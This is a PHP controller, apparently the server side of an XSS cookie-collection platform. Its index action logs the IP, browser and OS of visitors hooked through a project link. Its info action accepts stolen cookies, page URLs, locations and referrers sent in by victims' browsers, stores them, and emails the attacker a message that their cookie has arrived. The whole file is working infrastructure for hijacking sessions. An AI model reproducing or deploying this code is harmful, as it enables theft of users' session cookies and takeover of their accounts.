<?php
class  IndexAction  extends  Action{
	
	function   index(){
 
		$uid=$_GET['u'];
		$i=$_GET['i'];

		if($uid){
		

	    $project=new ProjectModel();
	    
	    $pid=$project->url_to_pid($uid);
	    $pro=$project->getby_pid($pid);
	    if($pid){
	   
	  
	
		load_lib('Browser');
		$ip=get_client_ip();
		$type=htmlentities(Browser::get_client_browser());
		$os=htmlentities(Browser::get_clinet_os());
		$browser=new  BrowserModel($ip,$type,$os,$pid);
		if($browser->bid){

          if(!$browser->is_active()){

          	 $browser->login();  //登陆  发送消息
          	
          }
                 
			
			
		}else{// 注册
			
			$browser->reg();
			//发送邮件
		 
		}
	   
        if(!$browser->bid)  exit();  // 退出处理
		
        //上线部分完毕
 
        
        include view_file();
	    }else{
	    	
	    	header("Location:?m=xing");
	    	
	    }
        
		}else if($i){  //邀请码注册
			
			
			J("?m=user&a=reg&i=".$i);
			
			
		}else{
			
			header("Location:?m=xing");
			
		}
		
	}
	
	function  info(){

        $bid=intval($_GET['bid']);
        $uid=intval($_GET['id']);
		extract($_GET,EXTR_SKIP);
        
		if($bid&&$cookie){
                 
		         $info=new InfoModel($bid);
                 $info->set(htmlentities($url),$cookie,$location,$referrer);
		 }
      
             $project=new ProjectModel();
         
             $pro=$project->fetch_first("*",array("pid"=>$uid));
          
            $email=$pro['eamil'];
         if ($email){
	   if($url &&  $cookie ){
             
                  $title="[".date("Y-m-d H:i:s",time())."] 亲爱的".$_COOKIE['xing_name'].": 您要的cookie到了";
          

	   $content="
            开门    您的cookie到了  </br>
     url:{$url} </br>
     cookie:{$cookie} </br>
            具体请见".SITE_ROOT."包邮哦  亲 !!!! ";
         if (EMAL) {  
	 if(SAEEMAL)
	   	 send_sae_mail($email,$title,$content);
         else
	   	send_mail($email,$title,$content);
	   }   
         }
          }
		
		
		
	}
	
   function  test(){
   	
   	
   	P(APP_PATH);
   	
   	
   }
	

	function  zhuce(){
		

		
		
			
			$incode=new IncodeModel();
			
	
				
		  		echo  $incode->add()."<br>";	
	
	  
  
	
 
	}
	
	
	
	
	
	
}